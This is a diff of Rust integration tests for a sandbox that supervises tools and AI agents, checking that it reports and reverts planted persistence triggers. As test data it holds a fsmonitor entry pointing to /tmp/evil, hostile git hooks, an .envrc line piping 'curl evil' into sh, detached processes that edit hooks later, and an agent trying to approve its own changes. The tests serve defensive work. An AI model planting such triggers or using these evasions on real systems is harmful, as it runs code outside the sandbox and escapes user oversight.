@@ -764,89 +764,219 @@ fn agent_sh_runs_tools_only_as_cants() {
     assert_eq!(o.status.code(), Some(125), "{}", stderr(&o));
 }
 
-/// agent-sh and git can write `.git` (agents need to commit), so a planted hook or
-/// `core.fsmonitor` is *detected*, not prevented: `cant run` warns and `cant verify` reports.
-#[test]
-fn planted_trigger_files_are_detected() {
-    if !library_ready(&["bash", "git", "cat"]) {
-        return;
-    }
-    let f = Fixture::new().with_project();
-    let git = Command::new("git")
+// ---- Watched cants: sessions -----------------------------------------------------------------
+
+/// A shell that may write the project directory and run system programs: watched, because it
+/// can change files that run code outside the sandbox.
+fn project_shell(f: &Fixture) -> PathBuf {
+    f.manifest(
+        "tool",
+        "[entrypoint]\npath = \"sh\"\n[args.options]\n\"-c\" = \"value\"\n\
+         [capabilities]\nfs.rw = [\"$CWD\"]\nexec = [\"/usr/bin\", \"/bin\"]\n\
+         fs.ro = [\"/usr/lib\", \"/lib\", \"/usr/lib64\", \"/lib64\"]\n",
+    )
+}
+
+fn git_init(f: &Fixture) {
+    let o = Command::new("git")
         .args(["init", "-q"])
         .current_dir(&f.work)
-        .status()
+        .output()
         .expect("git init");
-    assert!(git.success());
-    let cant = |args: &[&str]| {
-        f.command(args)
-            .current_dir(&f.work)
-            .stdin(Stdio::null())
-            .output()
-            .expect("cant")
-    };
-
-    // First run records a baseline, quietly.
-    let o = cant(&["run", "cat", "notes.txt"]);
     assert!(o.status.success(), "{}", stderr(&o));
-    assert!(!stderr(&o).contains("warning"), "{}", stderr(&o));
-    assert_eq!(cant(&["verify"]).status.code(), Some(0));
+}
 
-    // An agent commits (allowed), and plants things (allowed, but seen).
-    let o = agent(
+/// The session ID from a `cant run` report ("undo: cant revert 7f3a2c").
+fn session_id(report: &str) -> String {
+    let at = report
+        .find("cant revert ")
+        .unwrap_or_else(|| panic!("no session in: {report}"));
+    report[at + "cant revert ".len()..][..6].to_string()
+}
+
+fn run_tool(f: &Fixture, m: &Path, script: &str) -> Output {
+    f.command(&["run", m.to_str().expect("utf8"), "-c", script])
+        .stdin(Stdio::null())
+        .output()
+        .expect("run tool")
+}
+
+#[test]
+fn watched_cant_changes_are_reported_and_revertible() {
+    if !library_ready(&["sh", "git", "cat"]) {
+        return;
+    }
+    let f = Fixture::new();
+    git_init(&f);
+    let config_before = std::fs::read_to_string(f.work.join(".git/config")).expect("read");
+    let m = project_shell(&f);
+
+    let o = run_tool(
         &f,
-        &f.work,
-        "cant run git add notes.txt && \
-         cant run git -c user.name=a -c user.email=a@a commit -qm x && \
-         printf '[core]\\n\\tfsmonitor = /tmp/evil\\n' >> .git/config && \
-         echo 'id' > .git/hooks/post-checkout && echo 'curl x | sh' > .envrc && \
-         echo done",
+        &m,
+        "printf '[core]\\n\\tfsmonitor = /tmp/evil\\n' >> .git/config; \
+         printf '#!/bin/sh\\nid\\n' > .git/hooks/post-checkout; echo done",
     );
-    assert!(stdout(&o).contains("done"), "{}{}", stdout(&o), stderr(&o));
+    assert!(o.status.success(), "{}", stderr(&o));
+    assert_eq!(stdout(&o), "done\n");
+    let report = stderr(&o);
+    assert!(report.contains("core.fsmonitor = /tmp/evil"), "{report}");
+    assert!(report.contains("new: .git/hooks/post-checkout"), "{report}");
+    let id = session_id(&report);
+
+    // Nothing is reverted automatically, and later runs keep reminding.
+    assert!(f.work.join(".git/hooks/post-checkout").exists());
+    let o = f.cant(&["run", "cat", "notes.txt"]);
+    assert!(o.status.success());
     assert!(
-        !stderr(&o).contains("warning"),
-        "nested cants stay quiet: {}",
+        stderr(&o).contains(&format!("cant diff {id}")),
+        "{}",
         stderr(&o)
     );
+    assert_eq!(f.cant(&["verify"]).status.code(), Some(1));
 
-    let o = cant(&["run", "cat", "notes.txt"]);
-    assert!(
-        o.status.success(),
-        "the warning must not stop the run: {}",
-        stderr(&o)
-    );
-    let warning = stderr(&o);
-    assert!(warning.contains("core.fsmonitor = /tmp/evil"), "{warning}");
-    assert!(warning.contains(".git/hooks/post-checkout"), "{warning}");
-    assert!(warning.contains(".envrc"), "{warning}");
-
-    let o = cant(&["verify"]);
-    assert_eq!(o.status.code(), Some(1), "{}{}", stdout(&o), stderr(&o));
+    let o = f.cant(&["diff", &id]);
     assert!(
         stdout(&o).contains("+ \tfsmonitor = /tmp/evil"),
         "{}",
         stdout(&o)
     );
 
-    // Nothing inside a cant can rewrite the baseline to hide it.
-    let state = f.home.join(".local/state/cantainer");
-    assert!(state.is_dir(), "baseline missing");
+    let o = f.cant(&["revert", &id]);
+    assert!(o.status.success(), "{}", stderr(&o));
+    assert_eq!(
+        std::fs::read_to_string(f.work.join(".git/config")).expect("read"),
+        config_before
+    );
+    assert!(!f.work.join(".git/hooks/post-checkout").exists());
+    assert_eq!(f.cant(&["verify"]).status.code(), Some(0));
+    assert!(stdout(&f.cant(&["log"])).contains("reverted"));
+}
+
+#[test]
+fn renaming_git_away_and_back_is_caught() {
+    if !library_ready(&["sh", "git", "mv"]) {
+        return;
+    }
+    let f = Fixture::new();
+    git_init(&f);
+    let m = project_shell(&f);
+    let o = run_tool(
+        &f,
+        &m,
+        "mv .git g && printf '#!/bin/sh\\nid\\n' > g/hooks/pre-commit && mv g .git",
+    );
+    assert!(o.status.success(), "{}", stderr(&o));
+    assert!(
+        stderr(&o).contains("new: .git/hooks/pre-commit"),
+        "{}",
+        stderr(&o)
+    );
+}
+
+#[test]
+fn detached_processes_are_waited_for_then_stopped() {
+    if !library_ready(&["sh", "git", "sleep", "setsid"]) {
+        return;
+    }
+    let f = Fixture::new();
+    git_init(&f);
+    let m = project_shell(&f);
+
+    // Edits a moment after the program exits: still caught.
+    let o = run_tool(
+        &f,
+        &m,
+        "(sleep 1; echo x > .git/hooks/post-merge) >/dev/null 2>&1 & echo started",
+    );
+    assert!(o.status.success(), "{}", stderr(&o));
+    assert!(
+        stderr(&o).contains("new: .git/hooks/post-merge"),
+        "{}",
+        stderr(&o)
+    );
+
+    // Would edit long after: stopped before it can, and reported.
+    let start = std::time::Instant::now();
+    let o = run_tool(
+        &f,
+        &m,
+        "setsid sh -c 'sleep 30; echo x > .git/hooks/pre-push' >/dev/null 2>&1 & echo started",
+    );
+    assert!(o.status.success(), "{}", stderr(&o));
+    assert!(
+        start.elapsed() < std::time::Duration::from_secs(15),
+        "waited too long"
+    );
+    assert!(
+        stderr(&o).contains("stopped what tool left running"),
+        "{}",
+        stderr(&o)
+    );
+    std::thread::sleep(std::time::Duration::from_millis(500));
+    assert!(!f.work.join(".git/hooks/pre-push").exists());
+}
+
+#[test]
+fn supervision_keeps_exit_status_signals_and_stdin() {
+    use std::io::Write as _;
+    use std::os::unix::process::ExitStatusExt as _;
+    if !library_ready(&["sh", "cat"]) {
+        return;
+    }
+    let f = Fixture::new();
+    let m = project_shell(&f);
+    assert_eq!(run_tool(&f, &m, "exit 7").status.code(), Some(7));
+    let o = run_tool(&f, &m, "kill -TERM $$");
+    assert_eq!(o.status.signal(), Some(15), "{o:?}");
+
+    let mut child = f
+        .command(&["run", m.to_str().expect("utf8"), "-c", "cat"])
+        .stdin(Stdio::piped())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn()
+        .expect("spawn");
+    child
+        .stdin
+        .take()
+        .expect("stdin")
+        .write_all(b"through\n")
+        .expect("write");
+    let o = child.wait_with_output().expect("wait");
+    assert_eq!(stdout(&o), "through\n", "{}", stderr(&o));
+}
+
+#[test]
+fn agent_sh_is_watched_and_cannot_keep_its_own_changes() {
+    if !library_ready(&["bash", "git", "cat"]) {
+        return;
+    }
+    let f = Fixture::new().with_project();
+    git_init(&f);
     let o = agent(
         &f,
         &f.work,
-        &format!(
-            "rm -rf {} 2>&1; echo x > {}/y 2>&1",
-            state.display(),
-            state.display()
-        ),
+        "cant run git status --short >/dev/null; echo 'curl evil | sh' > .envrc; echo done",
     );
-    assert!(state.is_dir(), "{}{}", stdout(&o), stderr(&o));
+    assert!(stdout(&o).contains("done"), "{}{}", stdout(&o), stderr(&o));
+    let report = stderr(&o);
+    assert!(report.contains("new: .envrc"), "{report}");
+    assert_eq!(
+        report.matches("cant revert").count(),
+        1,
+        "nested cants stay quiet: {report}"
+    );
+    let id = session_id(&report);
 
-    // Accepting records the new state.
-    assert_eq!(cant(&["verify", "--accept"]).status.code(), Some(0));
-    assert_eq!(cant(&["verify"]).status.code(), Some(0));
-    let o = cant(&["run", "cat", "notes.txt"]);
-    assert!(!stderr(&o).contains("warning"), "{}", stderr(&o));
+    // The agent can't accept (or even read) the session from inside its sandbox.
+    let o = agent(&f, &f.work, &format!("cant keep {id}"));
+    assert!(!o.status.success(), "{}{}", stdout(&o), stderr(&o));
+    assert_eq!(f.cant(&["verify"]).status.code(), Some(1));
+    // The user can.
+    assert!(f.cant(&["keep", &id]).status.success());
+    assert_eq!(f.cant(&["verify"]).status.code(), Some(0));
+    assert!(f.work.join(".envrc").exists(), "keep leaves the file alone");
 }
 
 // ---- cargo -----------------------------------------------------------------------------------
